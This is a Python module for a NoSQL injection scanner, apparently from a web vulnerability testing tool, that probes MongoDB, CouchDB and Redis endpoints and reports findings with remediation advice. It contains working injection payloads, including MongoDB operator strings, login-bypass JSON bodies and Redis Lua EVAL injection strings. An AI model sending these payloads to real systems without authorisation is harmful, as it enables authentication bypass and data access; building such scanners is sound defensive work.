"""
NoSQL Injection Scanner
Tests for NoSQL database injection vulnerabilities (MongoDB, CouchDB, Redis, etc.)
"""
import json
import re
from typing import List, Optional, Dict
from urllib.parse import urlencode, parse_qs
from .base import BaseScanner, Vulnerability, Severity


class NoSQLInjectionScanner(BaseScanner):
    """NoSQL injection vulnerability scanner"""
    
    def __init__(self, http_client, engine=None):
        super().__init__(http_client, engine)
        self.name = "NoSQL Injection Scanner"
        
        # NoSQL injection payloads
        self.mongodb_payloads = [
            # Boolean-based
            {"$ne": "test"},
            {"$gt": ""},
            {"$lt": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
            {"$or": [{"1": "1"}, {"1": "2"}]},
            {"$and": [{"1": "1"}, {"1": "1"}]},
            # Time-based
            {"$where": "sleep(5000)"},
            # Error-based
            {"$gt": None},
            {"$ne": None},
        ]
        
        self.couchdb_payloads = [
            {"$ne": "test"},
            {"$gt": ""},
            {"$regex": ".*"},
        ]
        
        self.redis_payloads = [
            "EVAL 'return 1' 0",
            "EVAL 'return redis.call(\"get\", KEYS[1])' 1 test",
        ]
    
    async def scan(self, url: str, **kwargs) -> List[Vulnerability]:
        """Scan for NoSQL injection vulnerabilities"""
        vulnerabilities = []
        
        # Extract parameters from URL
        params = self._extract_params(url)
        
        # Test MongoDB injection
        vulns = await self._test_mongodb_injection(url, params)
        vulnerabilities.extend(vulns)
        
        # Test CouchDB injection
        vulns = await self._test_couchdb_injection(url, params)
        vulnerabilities.extend(vulns)
        
        # Test Redis injection
        vulns = await self._test_redis_injection(url, params)
        vulnerabilities.extend(vulns)
        
        # Test JSON-based NoSQL injection
        vulns = await self._test_json_nosql_injection(url, params)
        vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    def _extract_params(self, url: str) -> Dict[str, str]:
        """Extract parameters from URL"""
        params = {}
        
        if "?" in url:
            query_string = url.split("?")[1].split("#")[0]
            for param in query_string.split("&"):
                if "=" in param:
                    key, value = param.split("=", 1)
                    params[key] = value
        
        return params
    
    async def _test_mongodb_injection(self, url: str, params: Dict[str, str]) -> List[Vulnerability]:
        """Test for MongoDB injection"""
        vulnerabilities = []
        
        if not params:
            return vulnerabilities
        
        # Test each parameter
        for param_name, param_value in params.items():
            # Test boolean-based injection
            for payload in self.mongodb_payloads:
                try:
                    # Test in GET parameter
                    test_params = params.copy()
                    test_params[param_name] = json.dumps(payload)
                    
                    test_url = url.split("?")[0] + "?" + urlencode(test_params)
                    baseline = await self.http_client.get(url, timeout=5)
                    test_resp = await self.http_client.get(test_url, timeout=5)
                    
                    # Check for differences
                    if self._detect_nosql_injection(baseline, test_resp, "MongoDB"):
                        vuln = self._create_vulnerability(
                            name="MongoDB Injection (Boolean-based)",
                            severity=Severity.HIGH,
                            url=test_url,
                            parameter=param_name,
                            payload=json.dumps(payload),
                            description="MongoDB injection vulnerability detected via boolean-based technique",
                            evidence="Response difference detected with MongoDB operator payload",
                            recommendation="Use parameterized queries and input validation. Avoid using user input directly in MongoDB queries.",
                            cwe="CWE-943"
                        )
                        vulnerabilities.append(vuln)
                        break
                except:
                    continue
            
            # Test in POST JSON body
            try:
                test_data = {param_name: {"$ne": "test"}}
                test_resp = await self.http_client.post(
                    url.split("?")[0],
                    json=test_data,
                    headers={"Content-Type": "application/json"},
                    timeout=5
                )
                
                baseline = await self.http_client.post(
                    url.split("?")[0],
                    json={param_name: "test"},
                    headers={"Content-Type": "application/json"},
                    timeout=5
                )
                
                if self._detect_nosql_injection(baseline, test_resp, "MongoDB"):
                    vuln = self._create_vulnerability(
                        name="MongoDB Injection (JSON-based)",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param_name,
                        payload='{"$ne": "test"}',
                        description="MongoDB injection vulnerability in JSON request body",
                        evidence="Response difference detected with MongoDB operator in JSON",
                        recommendation="Validate and sanitize all JSON input. Use MongoDB's built-in parameterization.",
                        cwe="CWE-943"
                    )
                    vulnerabilities.append(vuln)
            except:
                continue
        
        return vulnerabilities
    
    async def _test_couchdb_injection(self, url: str, params: Dict[str, str]) -> List[Vulnerability]:
        """Test for CouchDB injection"""
        vulnerabilities = []
        
        if not params:
            return vulnerabilities
        
        for param_name, param_value in params.items():
            for payload in self.couchdb_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = json.dumps(payload)
                    
                    test_url = url.split("?")[0] + "?" + urlencode(test_params)
                    baseline = await self.http_client.get(url, timeout=5)
                    test_resp = await self.http_client.get(test_url, timeout=5)
                    
                    if self._detect_nosql_injection(baseline, test_resp, "CouchDB"):
                        vuln = self._create_vulnerability(
                            name="CouchDB Injection",
                            severity=Severity.HIGH,
                            url=test_url,
                            parameter=param_name,
                            payload=json.dumps(payload),
                            description="CouchDB injection vulnerability detected",
                            evidence="Response difference detected with CouchDB operator payload",
                            recommendation="Use parameterized queries and input validation for CouchDB queries.",
                            cwe="CWE-943"
                        )
                        vulnerabilities.append(vuln)
                        break
                except:
                    continue
        
        return vulnerabilities
    
    async def _test_redis_injection(self, url: str, params: Dict[str, str]) -> List[Vulnerability]:
        """Test for Redis injection (Lua script injection)"""
        vulnerabilities = []
        
        if not params:
            return vulnerabilities
        
        redis_payloads = [
            "'; EVAL 'return 1' 0; --",
            "\"; EVAL 'return 1' 0; --",
            "'; redis.call('get', 'test'); --",
        ]
        
        for param_name, param_value in params.items():
            for payload in redis_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    test_url = url.split("?")[0] + "?" + urlencode(test_params)
                    baseline = await self.http_client.get(url, timeout=5)
                    test_resp = await self.http_client.get(test_url, timeout=5)
                    
                    # Check for Redis error messages
                    redis_errors = [
                        "redis",
                        "lua",
                        "eval",
                        "script error",
                        "wrong number of arguments",
                    ]
                    
                    if any(error in test_resp.text.lower() for error in redis_errors):
                        vuln = self._create_vulnerability(
                            name="Redis Injection (Lua Script)",
                            severity=Severity.HIGH,
                            url=test_url,
                            parameter=param_name,
                            payload=payload,
                            description="Redis injection vulnerability detected, allowing Lua script execution",
                            evidence="Redis error message detected in response",
                            recommendation="Sanitize all input before using in Redis commands. Avoid using EVAL with user input.",
                            cwe="CWE-94"
                        )
                        vulnerabilities.append(vuln)
                        break
                except:
                    continue
        
        return vulnerabilities
    
    async def _test_json_nosql_injection(self, url: str, params: Dict[str, str]) -> List[Vulnerability]:
        """Test for JSON-based NoSQL injection"""
        vulnerabilities = []
        
        # Test POST requests with JSON body
        json_payloads = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"$or": [{"username": "admin"}, {"username": "administrator"}]},
        ]
        
        for payload in json_payloads:
            try:
                baseline = await self.http_client.post(
                    url.split("?")[0],
                    json={"username": "test", "password": "test"},
                    headers={"Content-Type": "application/json"},
                    timeout=5
                )
                
                test_resp = await self.http_client.post(
                    url.split("?")[0],
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=5
                )
                
                if self._detect_nosql_injection(baseline, test_resp, "NoSQL"):
                    vuln = self._create_vulnerability(
                        name="NoSQL Injection (JSON-based)",
                        severity=Severity.HIGH,
                        url=url,
                        payload=json.dumps(payload),
                        description="NoSQL injection vulnerability in JSON request body",
                        evidence="Response difference detected with NoSQL operator in JSON payload",
                        recommendation="Validate and sanitize all JSON input. Use parameterized queries.",
                        cwe="CWE-943"
                    )
                    vulnerabilities.append(vuln)
                    break
            except:
                continue
        
        return vulnerabilities
    
    def _detect_nosql_injection(self, baseline, test_resp, db_type: str) -> bool:
        """Detect NoSQL injection based on response differences"""
        if baseline.status_code != test_resp.status_code:
            return True
        
        # Check for significant length difference
        length_diff = abs(len(baseline.text) - len(test_resp.text))
        if length_diff > 200:
            return True
        
        # Check for NoSQL error messages
        nosql_errors = [
            "mongodb",
            "mongo",
            "couchdb",
            "couch",
            "redis",
            "nosql",
            "bson",
            "objectid",
            "invalid operator",
            "$ne",
            "$gt",
            "$lt",
            "$regex",
            "$where",
        ]
        
        test_lower = test_resp.text.lower()
        if any(error in test_lower for error in nosql_errors):
            return True
        
        # Check for authentication bypass patterns
        auth_bypass_indicators = [
            "welcome",
            "dashboard",
            "admin",
            "logged in",
            "authentication successful",
        ]
        
        baseline_lower = baseline.text.lower()
        test_lower = test_resp.text.lower()
        
        # If baseline shows error but test shows success
        if any(indicator in test_lower for indicator in auth_bypass_indicators):
            if not any(indicator in baseline_lower for indicator in auth_bypass_indicators):
                return True
        
        return False

